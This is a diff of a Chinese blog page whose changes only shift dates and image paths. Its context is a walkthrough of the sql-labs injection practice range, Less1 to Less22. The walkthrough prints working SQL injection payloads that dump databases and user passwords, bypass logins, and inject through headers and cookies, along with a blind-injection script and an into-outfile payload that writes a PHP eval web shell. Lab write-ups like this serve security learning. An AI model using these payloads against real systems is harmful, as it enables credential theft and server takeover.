@@ -165,8 +165,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-06-01 00:23" pubdate>
-        June 1, 2020 am
+      <time datetime="2020-01-01 00:23" pubdate>
+        January 1, 2020 am
       </time>
     </span>
   
@@ -227,7 +227,7 @@
 
 
 
-<h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h2><h3 id="1-information-schema"><a href="#1-information-schema" class="headerlink" title="1.information_schema"></a>1.information_schema</h3><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216142604439.png" srcset="/img/loading.gif" alt="image-20210216142604439"></p>
+<h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h2><h3 id="1-information-schema"><a href="#1-information-schema" class="headerlink" title="1.information_schema"></a>1.information_schema</h3><p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216142604439.png" srcset="/img/loading.gif" alt="image-20210216142604439"></p>
 <p>information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。把mysql数据库看作一本书，则它相当于mysql数据库的目录。</p>
 <p>我们经常在注入时结合information_schema来爆数据库、表、字段等等。介绍几个常用的</p>
 <pre><code class="hljs mysql">information_schema.schemata	所有数据库名，show databases()的结果就是取自于此；
@@ -541,47 +541,47 @@ linux下：修改&#x2F;etc&#x2F;my.cnf 在[mysqld]内加入secure_file_priv &#x3
 
 <p>或者是把写入的内容改为一句话木马也可。</p>
 <h2 id="2-靶场通关记录"><a href="#2-靶场通关记录" class="headerlink" title="2.靶场通关记录"></a>2.靶场通关记录</h2><h3 id="Less1：GET基于报错的字符型注入-单引号"><a href="#Less1：GET基于报错的字符型注入-单引号" class="headerlink" title="Less1：GET基于报错的字符型注入(单引号)"></a>Less1：GET基于报错的字符型注入(单引号)</h3><p>1.找到注入点：id</p>
-<img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216160721715.png" srcset="/img/loading.gif" alt="image-20210216160721715" style="zoom:80%;">
+<img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216160721715.png" srcset="/img/loading.gif" alt="image-20210216160721715" style="zoom:80%;">
 
 <p>2.进行试错，猜测语句</p>
-<img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216161133243.png" srcset="/img/loading.gif" alt="image-20210216161133243" style="zoom:80%;">
+<img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216161133243.png" srcset="/img/loading.gif" alt="image-20210216161133243" style="zoom:80%;">
 
 <p>则语句为：<code>select login_name,passwd from table where id = &#39;number&#39; limit 0,1</code></p>
 <p>3.判断字段数：3</p>
 <p>payload：<code>?id=1&#39;order by 4 --+</code></p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216164833065.png" srcset="/img/loading.gif" alt="image-20210216164833065" style="zoom:80%;"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216164901146.png" srcset="/img/loading.gif" alt="image-20210216164901146" style="zoom:80%;"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216164833065.png" srcset="/img/loading.gif" alt="image-20210216164833065" style="zoom:80%;"><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216164901146.png" srcset="/img/loading.gif" alt="image-20210216164901146" style="zoom:80%;"></p>
 <p>4.爆数据库</p>
 <p>MySQL中的所有数据库：</p>
 <p>payload：<code>?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</code></p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216171624988.png" srcset="/img/loading.gif" alt="image-20210216171624988"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216171624988.png" srcset="/img/loading.gif" alt="image-20210216171624988"></p>
 <p>当前正在使用的数据库以及系统的所有信息</p>
 <p>payload：<code>?id=-1&#39; union select 1,concat_ws(&#39;|&#39;,database(),version(),@@datadir,@@version_compile_os),user()  --+</code></p>
 <p>ps:<code>concat_ws</code>可替换为<code>group_concat</code></p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216193609512.png" srcset="/img/loading.gif" alt="image-20210216193609512"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216193609512.png" srcset="/img/loading.gif" alt="image-20210216193609512"></p>
 <p>5.爆表名     </p>
 <p>payload：<code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot; --+</code></p>
 <p>或者没有爆出当前表名：<code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216195024012.png" srcset="/img/loading.gif" alt="image-20210216195024012"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216195024012.png" srcset="/img/loading.gif" alt="image-20210216195024012"></p>
 <p>6.爆列名</p>
 <p>payload：<code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216195634870.png" srcset="/img/loading.gif" alt="image-20210216195634870"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216195634870.png" srcset="/img/loading.gif" alt="image-20210216195634870"></p>
 <p>7.爆出所有账户密码</p>
 <p>payload：<code>?id=-1&#39; union select 1,group_concat(username,password),3 from users --+</code></p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216195854574.png" srcset="/img/loading.gif" alt="image-20210216195854574"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216195854574.png" srcset="/img/loading.gif" alt="image-20210216195854574"></p>
 <h3 id="Less2：GET基于报错数字型注入"><a href="#Less2：GET基于报错数字型注入" class="headerlink" title="Less2：GET基于报错数字型注入"></a>Less2：GET基于报错数字型注入</h3><p>1.找到注入点：id</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216201108241.png" srcset="/img/loading.gif" alt="image-20210216201108241"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216201108241.png" srcset="/img/loading.gif" alt="image-20210216201108241"></p>
 <p>2.试错，猜语句</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216202344713.png" srcset="/img/loading.gif" alt="image-20210216202344713"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216202344713.png" srcset="/img/loading.gif" alt="image-20210216202344713"></p>
 <p>则语句：<code>select login_name,passwd from table where id = number limit 0,1</code></p>
 <p>找到闭合了就和less1一样了剩下的</p>
 <h3 id="Less3：GET基于报错字符型注入-带括号的单引号"><a href="#Less3：GET基于报错字符型注入-带括号的单引号" class="headerlink" title="Less3：GET基于报错字符型注入(带括号的单引号)"></a>Less3：GET基于报错字符型注入(带括号的单引号)</h3><p>1.寻找注入点：id</p>
 <p>2.试错，猜语句</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217001833673.png" srcset="/img/loading.gif" alt="image-20210217001833673"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217001833673.png" srcset="/img/loading.gif" alt="image-20210217001833673"></p>
 <p>则语句为：<code>select login_name,passwd from table where id=(&#39;1&#39;) limit 0,1</code></p>
 <p>闭合找到后和less1剩下的操作一样了</p>
 <h3 id="Less4：GET基于报错字符型注入-双引号"><a href="#Less4：GET基于报错字符型注入-双引号" class="headerlink" title="Less4：GET基于报错字符型注入(双引号)"></a>Less4：GET基于报错字符型注入(双引号)</h3><p>1.寻找注入点：id</p>
 <p>2.试错，猜语句</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217003701458.png" srcset="/img/loading.gif" alt="image-20210217003701458"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217003701458.png" srcset="/img/loading.gif" alt="image-20210217003701458"></p>
 <p>则语句为：<code>select login_name,passwd from table where id=(”1“) limit 0,1</code></p>
 <p>剩下的操作参考less1</p>
 <h3 id="Less5：GET双查询字符型-单引号"><a href="#Less5：GET双查询字符型-单引号" class="headerlink" title="Less5：GET双查询字符型(单引号)"></a>Less5：GET双查询字符型(单引号)</h3><p>这一关如果正确则显示you are in …,失败则会报错。这一关可以当作盲注解决，但是如题目一样使用双查询</p>
@@ -589,28 +589,28 @@ linux下：修改&#x2F;etc&#x2F;my.cnf 在[mysqld]内加入secure_file_priv &#x3
 <pre><code class="hljs mysql">#当前使用数据库
 ?id&#x3D;-1&#39; union select 1,count(*), concat_ws(&#39;:&#39;,(select database()), floor(rand()*2))as a from information_schema.tables group by a --+</code></pre>
 
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219001046483.png" srcset="/img/loading.gif" alt="image-20210219001046483"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219001046483.png" srcset="/img/loading.gif" alt="image-20210219001046483"></p>
 <p>也可布尔盲注，参考less5</p>
 <h3 id="Less6：GET双查询字符型-双引号"><a href="#Less6：GET双查询字符型-双引号" class="headerlink" title="Less6：GET双查询字符型(双引号)"></a>Less6：GET双查询字符型(双引号)</h3><p>和less5一样，只不过闭合是双引号。</p>
 <h3 id="Less7：盲注GET文件写入"><a href="#Less7：盲注GET文件写入" class="headerlink" title="Less7：盲注GET文件写入"></a>Less7：盲注GET文件写入</h3><p>1.注入点：id</p>
 <p>2.猜语句，经过多次实验，只有输入<code>&#39;</code>会报错</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217174821016.png" srcset="/img/loading.gif" alt="image-20210217174821016"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217174821016.png" srcset="/img/loading.gif" alt="image-20210217174821016"></p>
 <p>没有错误提示，盲注，经过多次实验，以下可行</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217175333779.png" srcset="/img/loading.gif" alt="image-20210217175333779"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217175333779.png" srcset="/img/loading.gif" alt="image-20210217175333779"></p>
 <p>则猜测语句注入点为：<code>?id=((&#39;1&#39;))</code></p>
 <p>3.猜字段</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217180130902.png" srcset="/img/loading.gif" alt="image-20210217180130902"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217180147338.png" srcset="/img/loading.gif" alt="image-20210217180147338"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217180130902.png" srcset="/img/loading.gif" alt="image-20210217180130902"><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217180147338.png" srcset="/img/loading.gif" alt="image-20210217180147338"></p>
 <p>4.写shell</p>
 <p>payload：<code>?id=-1&#39;)) union select 1,&#39;&lt;?php @eval($POST_[1])?&gt;&#39;3 into outfile&#39;C:\\test\\1.php&#39; --+</code></p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217183945287.png" srcset="/img/loading.gif" alt="image-20210217183945287"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217183945287.png" srcset="/img/loading.gif" alt="image-20210217183945287"></p>
 <h3 id="Less8：GET布尔盲注"><a href="#Less8：GET布尔盲注" class="headerlink" title="Less8：GET布尔盲注"></a>Less8：GET布尔盲注</h3><p>1.注入点：id</p>
 <p>2.猜关键点语句</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217184401867.png" srcset="/img/loading.gif" alt="image-20210217184401867"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217184401867.png" srcset="/img/loading.gif" alt="image-20210217184401867"></p>
 <p>没有错误提示，是盲注，只有一次次自己实验闭合</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217184336953.png" srcset="/img/loading.gif" alt="image-20210217184336953"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217184336953.png" srcset="/img/loading.gif" alt="image-20210217184336953"></p>
 <p>则关键点闭合为：<code>?id=&#39;1&#39;</code></p>
 <p>3.猜字段：3</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217193145935.png" srcset="/img/loading.gif" alt="image-20210217193145935"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217193201961.png" srcset="/img/loading.gif" alt="image-20210217193201961"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217193145935.png" srcset="/img/loading.gif" alt="image-20210217193145935"><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217193201961.png" srcset="/img/loading.gif" alt="image-20210217193201961"></p>
 <p>4.跑数据，用二分法，用burp跑步骤太多了。</p>
 <pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 
@@ -646,7 +646,7 @@ i=<span class="hljs-number">0</span>
 
 print(result)</code></pre>
 
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217202626517.png" srcset="/img/loading.gif" alt="image-20210217202626517"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217202626517.png" srcset="/img/loading.gif" alt="image-20210217202626517"></p>
 <h3 id="Less9：GET时间盲注-单引号"><a href="#Less9：GET时间盲注-单引号" class="headerlink" title="Less9：GET时间盲注(单引号)"></a>Less9：GET时间盲注(单引号)</h3><p>1.注入点：id</p>
 <p>2.试错，猜语句.猜鸭儿，试了很多语句都是一样的回显，看了眼后台果断懵逼，不会有第二种结果。。。</p>
 <p>老规矩二分法</p>
@@ -718,7 +718,7 @@ print(result)</code></pre>
 
 
 <h3 id="Less11：POST报错注入字符型-单引号"><a href="#Less11：POST报错注入字符型-单引号" class="headerlink" title="Less11：POST报错注入字符型(单引号)"></a>Less11：POST报错注入字符型(单引号)</h3><p>发现登录界面，随便试错猜语句</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210218002409207.png" srcset="/img/loading.gif" alt="image-20210218002409207"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210218002409207.png" srcset="/img/loading.gif" alt="image-20210218002409207"></p>
 <p>则语句：<code>uname=&#39;1&#39; and password=&#39;&#39; LIMIT 0,1</code></p>
 <p>直接在登陆界面执行以下payload可以查询到数据库，表，账户密码信息</p>
 <pre><code class="hljs mysql">MySQL中的所有数据库：	
@@ -739,7 +739,7 @@ print(result)</code></pre>
 
 
 <p>或者是直接进后台得到一个账号密码：<code>1&#39; or 1=1 #</code></p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210218005003622.png" srcset="/img/loading.gif" alt="image-20210218005003622"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210218005003622.png" srcset="/img/loading.gif" alt="image-20210218005003622"></p>
 <h3 id="Less12：POST报错注入字符型-带单括号的单引号"><a href="#Less12：POST报错注入字符型-带单括号的单引号" class="headerlink" title="Less12：POST报错注入字符型(带单括号的单引号)"></a>Less12：POST报错注入字符型(带单括号的单引号)</h3><p>按less11的步骤来，只不过是以<code>&quot;)</code>闭合的</p>
 <h3 id="Less13：POST字符型双查询-带括号的单引号"><a href="#Less13：POST字符型双查询-带括号的单引号" class="headerlink" title="Less13：POST字符型双查询(带括号的单引号)"></a>Less13：POST字符型双查询(带括号的单引号)</h3><p>利用方法参考less5。另外：</p>
 <p>updatexml测试有回显：<code>111&#39;) and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#</code></p>
@@ -786,30 +786,30 @@ print(result)</code></pre>
 <h3 id="Less15：POST布尔-时间盲注-带单引号"><a href="#Less15：POST布尔-时间盲注-带单引号" class="headerlink" title="Less15：POST布尔/时间盲注(带单引号)"></a>Less15：POST布尔/时间盲注(带单引号)</h3><p>lesss14中的盲注双引号改为单引号即可</p>
 <p>也可手动burp操作</p>
 <p>例如猜数据库长度</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219011737775.png" srcset="/img/loading.gif" alt="image-20210219011737775"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219011737775.png" srcset="/img/loading.gif" alt="image-20210219011737775"></p>
 <p>成功后响应时间变长</p>
 <p>1’ and updatexml(1,concat(0x7e,(select @@version()),0x7e),1)#</p>
 <h3 id="Less16：POST布尔-时间盲注-带双引号"><a href="#Less16：POST布尔-时间盲注-带双引号" class="headerlink" title="Less16：POST布尔/时间盲注(带双引号)"></a>Less16：POST布尔/时间盲注(带双引号)</h3><p>lesss14中的盲注脚本即可</p>
 <h3 id="Less17：update"><a href="#Less17：update" class="headerlink" title="Less17：update"></a>Less17：update</h3><p>这一关难搞，试了半天的username，打开后台一瞅，好家伙全是转义。。。</p>
 <p>如其名，猜测就是更新数据的，所以试一试updatexml，成了。</p>
 <p>payload：<code>1&#39; and updatexml(1,concat(0x7e,(select version()),0x7e),1)#</code></p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219122421671.png" srcset="/img/loading.gif" alt="image-20210219122421671"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219122421671.png" srcset="/img/loading.gif" alt="image-20210219122421671"></p>
 <p>需要注意的是，既然是更新信息，那么所选择的username在数据库中要存在</p>
 <h3 id="Less18：http-useragent注入"><a href="#Less18：http-useragent注入" class="headerlink" title="Less18：http-useragent注入"></a>Less18：http-useragent注入</h3><p>这一关要先知道账号密码，可以使用brup进行爆破得到，然后进行UA注入</p>
 <p>payload：<code> &#39;and  updatexml(1,concat(0x7e,@@version,0x7e),1) or &#39;1&#39;=&#39;1</code></p>
 <p>这里不直接注释掉是因为后台是先进行插入，再显示出来的。</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219164225757.png" srcset="/img/loading.gif" alt="image-20210219164225757"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219164225757.png" srcset="/img/loading.gif" alt="image-20210219164225757"></p>
 <h3 id="Less19：http-refer注入"><a href="#Less19：http-refer注入" class="headerlink" title="Less19：http-refer注入"></a>Less19：http-refer注入</h3><p>和less18一样，在refer进行注入</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219164503461.png" srcset="/img/loading.gif" alt="image-20210219164503461"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219164503461.png" srcset="/img/loading.gif" alt="image-20210219164503461"></p>
 <h3 id="Less20：cooike注入"><a href="#Less20：cooike注入" class="headerlink" title="Less20：cooike注入"></a>Less20：cooike注入</h3><p>找个账号登进去</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219173109251.png" srcset="/img/loading.gif" alt="image-20210219173109251"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219173109251.png" srcset="/img/loading.gif" alt="image-20210219173109251"></p>
 <p>抓包修改cooike：<code>uname=admin&#39; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#</code></p>
 <h3 id="less21：cookie-base64（带括号的单引号）"><a href="#less21：cookie-base64（带括号的单引号）" class="headerlink" title="less21：cookie-base64（带括号的单引号）"></a>less21：cookie-base64（带括号的单引号）</h3><p>瞅瞅，base64加密了，简单嘛，把上一关的payloadbase64一下就o了</p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219181040717.png" srcset="/img/loading.gif" alt="image-20210219181040717"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219181040717.png" srcset="/img/loading.gif" alt="image-20210219181040717"></p>
 <p>先试试闭合</p>
 <p>尝试各种闭合之后发现<code>1&#39;) #</code>不会报错</p>
 <p>payload：<code>uname=YWRtaW4xJylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKFNFTEVDVCBkYXRhYmFzZSgpKSwweDdlKSwxKSM=</code></p>
-<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219185850820.png" srcset="/img/loading.gif" alt="image-20210219185850820"></p>
+<p><img src="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219185850820.png" srcset="/img/loading.gif" alt="image-20210219185850820"></p>
 <p>建议加解密到此网站：<a target="_blank" rel="noopener" href="https://tool.oschina.net/encrypt?type=3%EF%BC%8C%E8%B8%A9%E4%BA%86%E5%BE%88%E5%A4%9A%E5%9D%91%E3%80%82%E3%80%82%E3%80%82">https://tool.oschina.net/encrypt?type=3，踩了很多坑。。。</a></p>
 <h3 id="less22：cookie-base64（双引号）"><a href="#less22：cookie-base64（双引号）" class="headerlink" title="less22：cookie-base64（双引号）"></a>less22：cookie-base64（双引号）</h3><p>经过实验和less21只是闭合不一样，换成双引号就好了</p>
 <p>​</p>
@@ -836,9 +836,9 @@ print(result)</code></pre>
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/">
+                      <a href="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">sql-labs记录2</span>
+                        <span class="hidden-mobile">sql-labs记录3</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
